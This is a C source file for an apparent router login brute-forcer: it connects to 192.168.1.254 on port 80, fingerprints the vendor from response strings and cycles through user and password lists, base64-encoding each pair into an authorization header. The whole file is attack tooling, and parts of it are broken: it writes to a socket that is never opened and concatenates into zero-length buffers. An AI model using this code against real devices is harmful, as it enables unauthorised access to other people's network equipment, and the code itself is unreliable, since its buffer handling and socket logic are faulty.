#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "base64.c"
#include "consts.h"
#include "network.c"

int setSock(int *sockfd) { return (*sockfd = socket(AF_INET, SOCK_STREAM, 0)); }

int setConn(int *sockfd, struct sockaddr_in *serv_addr) {
  return connect(*sockfd, (struct sockaddr *)serv_addr, sizeof(*serv_addr));
}

int main(int argc, char *argv[]) {
  int sockfd = 0, n = 0, connPort = 80;
  int headerCnt = 0, vendorCnt = 0, bruteCnt = 0, firstMatch;
  int loginCnt = 0, passCnt = 0;
  char buff[1024], connAddr[] = "192.168.1.254";
  memset(buff, '\0', sizeof(buff));

  Socket sock = newSocket();
  sock.connect(&sock, "192.168.1.254", 80);

  do {

    write(sockfd, headers[headerCnt], sizeof(headers[headerCnt]));
    write(sockfd, headers[3], sizeof(headers[3]));
    write(sockfd, "\n\n\n", 2);

    while ((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
      buff[n] = 0;

      for (int i = 0; i < sizeof(recognizeList) / sizeof(recognizeList[0]);
           i++) {
        if (strstr(buff, recognizeList[i])) {

          // First match
          if (strcmp(recognizeList[i], recognizeList[1]))
            firstMatch = 1;

          // Second match
          if (firstMatch == 1 &&
              strcmp(recognizeList[i], recognizeList[2])) { // Ericsson GPOP OLD
            headerCnt = 1;
            vendorCnt = 1;
            break;
          }

          break;
        }
      }

      if (vendorCnt == 0) { // try brute force by any connection
      }

      char credentials[] = "", authHeader[] = "";
      while (loginCnt <= (sizeof(users) / 8) - 1) {
        for (; passCnt <= (sizeof(passwords) / 8) - 1; ++passCnt) {
          strcat(credentials, users[loginCnt]);
          strcat(credentials, ":");
          strcat(credentials, passwords[passCnt]);
          strcat(headers[4], base64_encode(credentials));
          printf(base64_encode(credentials));
          printf("\n");
          printf("%d %d \n", loginCnt, passCnt);
          memset(credentials, '\0', sizeof(credentials));
          if (passCnt == (sizeof(passwords) / 8) - 1)
            ++loginCnt;
          break;
        }
        break;
      }

      // if (strstr(buff,"d") != NULL) {
      //	write(sockfd, "root\n", 5);
      // }

      fputs(buff, stdout);
      printf("\n");
    }

    close(sockfd);

    printf("\n");
    printf(vendorList[vendorCnt]);
  } while (vendorCnt == 0);

  return 0;
}